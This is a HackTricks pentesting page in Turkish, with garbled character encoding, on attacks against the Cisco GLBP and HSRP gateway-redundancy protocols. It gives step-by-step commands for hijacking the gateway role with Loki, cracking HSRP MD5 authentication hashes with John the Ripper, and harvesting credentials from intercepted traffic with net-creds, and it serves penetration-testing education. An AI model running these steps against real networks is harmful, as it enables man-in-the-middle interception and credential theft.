# GLBP ve HSRP SaldÄ±rÄ±larÄ±

<details>

<summary><strong>AWS hacklemeyi sÄ±fÄ±rdan kahramana kadar Ã¶ÄŸrenin</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS KÄ±rmÄ±zÄ± TakÄ±m UzmanÄ±)</strong></a><strong> ile!</strong></summary>

HackTricks'Ä± desteklemenin diÄŸer yollarÄ±:

* **Åirketinizi HackTricks'te reklamÄ±nÄ± gÃ¶rmek istiyorsanÄ±z** veya **HackTricks'i PDF olarak indirmek istiyorsanÄ±z** [**ABONELÄ°K PLANLARI**]'na gÃ¶z atÄ±n (https://github.com/sponsors/carlospolop)!
* [**Resmi PEASS & HackTricks Ã¼rÃ¼nlerini**](https://peass.creator-spring.com) edinin
* [**PEASS Ailesi'ni**](https://opensea.io/collection/the-peass-family) keÅŸfedin, Ã¶zel [**NFT'lerimiz**](https://opensea.io/collection/the-peass-family) koleksiyonumuz
* **KatÄ±lÄ±n** ğŸ’¬ [**Discord grubuna**](https://discord.gg/hRep4RUj7f) veya [**telegram grubuna**](https://t.me/peass) veya bizi **Twitter** ğŸ¦ [**@hacktricks_live**](https://twitter.com/hacktricks_live)** takip edin.**
* **Hacking pÃ¼f noktalarÄ±nÄ±zÄ± paylaÅŸarak** [**HackTricks**](https://github.com/carlospolop/hacktricks) ve [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github depolarÄ±na PR gÃ¶ndererek.

</details>

<figure><img src="https://pentest.eu/RENDER_WebSec_10fps_21sec_9MB_29042024.gif" alt=""><figcaption></figcaption></figure>

{% embed url="https://websec.nl/" %}

## FHRP KaÃ§Ä±rma Genel BakÄ±ÅŸÄ±

### FHRP HakkÄ±nda Bilgiler
FHRP, birden fazla yÃ¶nlendiriciyi tek bir sanal birim haline getirerek aÄŸÄ±n saÄŸlamlÄ±ÄŸÄ±nÄ± saÄŸlamayÄ± amaÃ§layan bir protokol grubudur, bÃ¶ylece yÃ¼k daÄŸÄ±tÄ±mÄ± ve hata toleransÄ± artÄ±rÄ±lÄ±r. Cisco Systems, bu pakette GLBP ve HSRP gibi Ã¶nde gelen protokoller tanÄ±ttÄ±.

### GLBP ProtokolÃ¼ HakkÄ±nda Bilgiler
Cisco'nun oluÅŸturduÄŸu GLBP, TCP/IP yÄ±ÄŸÄ±nÄ±nda Ã§alÄ±ÅŸÄ±r ve iletiÅŸim iÃ§in UDP'yi 3222 numaralÄ± portta kullanÄ±r. GLBP grubundaki yÃ¶nlendiriciler, 3 saniyelik aralÄ±klarla "hello" paketleri alÄ±ÅŸveriÅŸi yapar. Bir yÃ¶nlendirici bu paketleri 10 saniye boyunca gÃ¶ndermezse, Ã§evrimdÄ±ÅŸÄ± olarak kabul edilir. Bununla birlikte, bu zamanlayÄ±cÄ±lar sabit deÄŸildir ve deÄŸiÅŸtirilebilir.

### GLBP Ä°ÅŸlemleri ve YÃ¼k DaÄŸÄ±tÄ±mÄ±
GLBP, tek bir sanal IP ile birleÅŸtirilmiÅŸ birden fazla sanal MAC adresi kullanarak yÃ¶nlendiriciler arasÄ±nda yÃ¼k daÄŸÄ±tÄ±mÄ±nÄ± saÄŸlayarak Ã¶ne Ã§Ä±kar. Bir GLBP grubunda, her yÃ¶nlendirici paket iletimine dahil olur. HSRP/VRRP'nin aksine, GLBP, ÅŸu mekanizmalar aracÄ±lÄ±ÄŸÄ±yla gerÃ§ek yÃ¼k dengelemesi sunar:

- **Ana Bilgisayara BaÄŸÄ±mlÄ± YÃ¼k Dengeleme:** Bir ana bilgisayara sÃ¼rekli AVF MAC adresi atamasÄ±nÄ± korur, bu, kararlÄ± NAT yapÄ±landÄ±rmalarÄ± iÃ§in Ã¶nemlidir.
- **Round-Robin YÃ¼k Dengeleme:** VarsayÄ±lan yaklaÅŸÄ±m, talep eden ana bilgisayarlara yÃ¶nelik AVF MAC adresi atamasÄ±nÄ± sÄ±rayla deÄŸiÅŸtirir.
- **AÄŸÄ±rlÄ±klÄ± Round-Robin YÃ¼k Dengeleme:** Ã–nceden belirlenmiÅŸ "AÄŸÄ±rlÄ±k" metriklerine dayalÄ± olarak yÃ¼kÃ¼ daÄŸÄ±tÄ±r.

### GLBP'de Ana BileÅŸenler ve Terimler
- **AVG (Aktif Sanal AÄŸ GeÃ§idi):** MAC adreslerini eÅŸ yÃ¶nlendiricilere atamaktan sorumlu ana yÃ¶nlendirici.
- **AVF (Aktif Sanal YÃ¶nlendirici):** AÄŸ trafiÄŸini yÃ¶netmek iÃ§in belirlenen bir yÃ¶nlendirici.
- **GLBP Ã–nceliÄŸi:** AVG'yi belirleyen bir metrik, varsayÄ±lan olarak 100'den baÅŸlar ve 1 ile 255 arasÄ±nda deÄŸiÅŸir.
- **GLBP AÄŸÄ±rlÄ±ÄŸÄ±:** Bir yÃ¶nlendiricideki mevcut yÃ¼kÃ¼ yansÄ±tÄ±r, manuel olarak veya Nesne Ä°zleme aracÄ±lÄ±ÄŸÄ±yla ayarlanabilir.
- **GLBP Sanal IP Adresi:** BaÄŸlÄ± tÃ¼m cihazlar iÃ§in aÄŸÄ±n varsayÄ±lan aÄŸ geÃ§idi olarak hizmet verir.

EtkileÅŸimler iÃ§in GLBP, ayrÄ±lmÄ±ÅŸ 224.0.0.102 Ã§oklu yayÄ±n adresini ve UDP portunu 3222 kullanÄ±r. YÃ¶nlendiriciler, 3 saniyelik aralÄ±klarla "hello" paketleri iletimi yapar ve bir paket 10 saniyelik bir sÃ¼re iÃ§inde kaÃ§Ä±rÄ±lÄ±rsa iÅŸlevsiz kabul edilir.

### GLBP SaldÄ±rÄ± MekanizmasÄ±
Bir saldÄ±rgan, en yÃ¼ksek Ã¶ncelik deÄŸerine (255) sahip bir GLBP paketi gÃ¶ndererek ana yÃ¶nlendirici haline gelebilir. Bu, trafik yakalama veya yÃ¶nlendirme olanaÄŸÄ± saÄŸlayarak DoS veya MITM saldÄ±rÄ±larÄ±na yol aÃ§abilir.

### Loki ile GLBP SaldÄ±rÄ±sÄ± GerÃ§ekleÅŸtirme
[Loki](https://github.com/raizo62/loki_on_kali), Ã¶ncelik ve aÄŸÄ±rlÄ±ÄŸÄ± 255'e ayarlanmÄ±ÅŸ bir paket enjekte ederek bir GLBP saldÄ±rÄ±sÄ± gerÃ§ekleÅŸtirebilir. SaldÄ±rÄ± Ã¶ncesi adÄ±mlar, Wireshark gibi araÃ§lar kullanÄ±larak sanal IP adresi, kimlik doÄŸrulama varlÄ±ÄŸÄ± ve yÃ¶nlendirici Ã¶ncelik deÄŸerlerini toplamayÄ± iÃ§erir.

SaldÄ±rÄ± AdÄ±mlarÄ±:
1. PromiskÃ¼ moduna geÃ§in ve IP yÃ¶nlendirmeyi etkinleÅŸtirin.
2. Hedef yÃ¶nlendiriciyi tanÄ±mlayÄ±n ve IP'sini alÄ±n.
3. Bir Ä°steksiz ARP oluÅŸturun.
4. AVG'yi taklit eden kÃ¶tÃ¼ amaÃ§lÄ± bir GLBP paketi enjekte edin.
5. SaldÄ±rganÄ±n aÄŸ arabirimine GLBP sanal IP'sini yansÄ±tan ikincil bir IP adresi atayÄ±n.
6. Tam trafik gÃ¶rÃ¼nÃ¼rlÃ¼ÄŸÃ¼ iÃ§in SNAT uygulayÄ±n.
7. Ä°nternet eriÅŸimini orijinal AVG yÃ¶nlendiricisi Ã¼zerinden devam ettirmek iÃ§in yÃ¶nlendirmeyi ayarlayÄ±n.

Bu adÄ±mlarÄ± takip ederek, saldÄ±rgan kendisini aÄŸ trafiÄŸini, ÅŸifrelenmemiÅŸ veya hassas verileri de iÃ§eren bir "orta adam" olarak konumlandÄ±rabilir ve analiz edebilir.

Demonstrasyon iÃ§in gereken komut parÃ§alarÄ± aÅŸaÄŸÄ±da verilmiÅŸtir:
```bash
# Enable promiscuous mode and IP forwarding
sudo ip link set eth0 promisc on
sudo sysctl -w net.ipv4.ip_forward=1

# Configure secondary IP and SNAT
sudo ifconfig eth0:1 10.10.100.254 netmask 255.255.255.0
sudo iptables -t nat -A POSTROUTING -o eth0 -j MASQUERADE

# Adjust routing
sudo route del default
sudo route add -net 0.0.0.0 netmask 0.0.0.0 gw 10.10.100.100
```
### HSRP SÄ±zma YÃ¶ntemi Pasif AÃ§Ä±klamasÄ± ve Komut DetaylarÄ±

#### HSRP (Hot Standby Router/Redundancy Protocol) Genel BakÄ±ÅŸ
HSRP, aÄŸ geÃ§idi yedekliliÄŸi iÃ§in tasarlanmÄ±ÅŸ Cisco'ya ait bir protokoldÃ¼r. Birden fazla fiziksel yÃ¶nlendiriciyi paylaÅŸÄ±lan bir IP adresine sahip tek bir mantÄ±ksal birim olarak yapÄ±landÄ±rmayÄ± saÄŸlar. Bu mantÄ±ksal birim, trafiÄŸi yÃ¶nlendirmekten sorumlu olan birincil yÃ¶nlendirici tarafÄ±ndan yÃ¶netilir. GLBP'nin aksine, yÃ¼k dengelemesi iÃ§in Ã¶ncelik ve aÄŸÄ±rlÄ±k gibi metrikler kullanmaz, HSRP trafiÄŸi yÃ¶netimi iÃ§in tek bir etkin yÃ¶nlendiriciye dayanÄ±r.

#### HSRP'de Roller ve Terimler
- **HSRP Etkin YÃ¶nlendirici**: Trafik akÄ±ÅŸÄ±nÄ± yÃ¶neten aÄŸ geÃ§idi olarak hareket eden cihaz.
- **HSRP Bekleme YÃ¶nlendirici**: Etkin yÃ¶nlendirici baÅŸarÄ±sÄ±z olursa devralmaya hazÄ±r yedek yÃ¶nlendirici.
- **HSRP Grubu**: Tek bir dayanÄ±klÄ± sanal yÃ¶nlendirici oluÅŸturmak iÃ§in iÅŸbirliÄŸi yapan yÃ¶nlendiriciler kÃ¼mesi.
- **HSRP MAC Adresi**: HSRP yapÄ±landÄ±rmasÄ±ndaki mantÄ±ksal yÃ¶nlendiriciye atanmÄ±ÅŸ sanal MAC adresi.
- **HSRP Sanal IP Adresi**: BaÄŸlÄ± cihazlar iÃ§in varsayÄ±lan aÄŸ geÃ§idi olarak hareket eden HSRP grubunun sanal IP adresi.

#### HSRP SÃ¼rÃ¼mleri
HSRP iki sÃ¼rÃ¼mde gelir, HSRPv1 ve HSRPv2, grup kapasitesi, Ã§oklu yayÄ±n IP kullanÄ±mÄ± ve sanal MAC adres yapÄ±sÄ± aÃ§Ä±sÄ±ndan farklÄ±lÄ±k gÃ¶sterir. Protokol, hizmet bilgileri alÄ±ÅŸveriÅŸi iÃ§in belirli Ã§oklu yayÄ±n IP adreslerini kullanÄ±r, Hello paketleri her 3 saniyede bir gÃ¶nderilir. Bir yÃ¶nlendiriciye 10 saniyelik bir sÃ¼re iÃ§inde paket alÄ±nmazsa etkin olmadÄ±ÄŸÄ± varsayÄ±lÄ±r.

#### HSRP SaldÄ±rÄ± MekanizmasÄ±
HSRP saldÄ±rÄ±larÄ±, Etkin YÃ¶nlendirici'nin rolÃ¼nÃ¼ zorla alarak maksimum Ã¶ncelik deÄŸeri enjekte etmeyi iÃ§erir. Bu, Man-In-The-Middle (MITM) saldÄ±rÄ±sÄ±na yol aÃ§abilir. Temel saldÄ±rÄ± Ã¶ncesi adÄ±mlar arasÄ±nda HSRP yapÄ±landÄ±rmasÄ± hakkÄ±nda veri toplamak yer alÄ±r, bu da trafiÄŸi analiz etmek iÃ§in Wireshark kullanÄ±larak yapÄ±labilir.

#### HSRP Kimlik DoÄŸrulamasÄ±nÄ± Atlayan AdÄ±mlar
1. HSRP verilerini iÃ§eren aÄŸ trafiÄŸini .pcap dosyasÄ± olarak kaydedin.
```shell
tcpdump -w hsrp_traffic.pcap
```
2. .pcap dosyasÄ±ndan MD5 karma deÄŸerlerini hsrp2john.py kullanarak Ã§Ä±karÄ±n.
```shell
python2 hsrp2john.py hsrp_traffic.pcap > hsrp_hashes
```
3. John the Ripper kullanarak MD5 karma deÄŸerlerini kÄ±rÄ±n.
```shell
john --wordlist=mywordlist.txt hsrp_hashes
```

**Loki ile HSRP Enjeksiyonu GerÃ§ekleÅŸtirme**

1. HSRP reklamlarÄ±nÄ± tanÄ±mlamak iÃ§in Loki'yi baÅŸlatÄ±n.
2. AÄŸ arayÃ¼zÃ¼nÃ¼ promiscuous moduna ayarlayÄ±n ve IP yÃ¶nlendirmeyi etkinleÅŸtirin.
```shell
sudo ip link set eth0 promisc on
sudo sysctl -w net.ipv4.ip_forward=1
```
3. Loki'yi belirli yÃ¶nlendiriciyi hedeflemek, kÄ±rÄ±lmÄ±ÅŸ HSRP ÅŸifresini girmek ve Etkin YÃ¶nlendiriciyi taklit etmek iÃ§in gerekli yapÄ±landÄ±rmalarÄ± yapmak iÃ§in kullanÄ±n.
4. Etkin YÃ¶nlendirici rolÃ¼nÃ¼ aldÄ±ktan sonra, aÄŸ arayÃ¼zÃ¼nÃ¼ ve IP tablolarÄ±nÄ± yapÄ±landÄ±rarak meÅŸru trafiÄŸi engelleyin.
```shell
sudo ifconfig eth0:1 10.10.100.254 netmask 255.255.255.0
sudo iptables -t nat -A POSTROUTING -o eth0 -j MASQUERADE
```
5. Trafik yÃ¶nlendirmek iÃ§in yÃ¶nlendirme tablosunu deÄŸiÅŸtirin ve eski Etkin YÃ¶nlendirici Ã¼zerinden trafiÄŸi yÃ¶nlendirin.
```shell
sudo route del default
sudo route add -net 0.0.0.0 netmask 0.0.0.0 gw 10.10.100.100
```
6. Yakalanan trafiÄŸe ait kimlik bilgilerini almak iÃ§in net-creds.py veya benzer bir yardÄ±mcÄ± programÄ± kullanÄ±n.
```shell
sudo python2 net-creds.py -i eth0
```

Bu adÄ±mlarÄ± uygulamak saldÄ±rganÄ±, GLBP sÄ±zma yÃ¶ntemi iÃ§in yapÄ±lan iÅŸlemlere benzer ÅŸekilde trafiÄŸi engellemek ve manipÃ¼le etmek iÃ§in bir konuma yerleÅŸtirir. Bu, HSRP gibi yedeklilik protokollerindeki zafiyeti ve saÄŸlam gÃ¼venlik Ã¶nlemlerine olan ihtiyacÄ± vurgular.
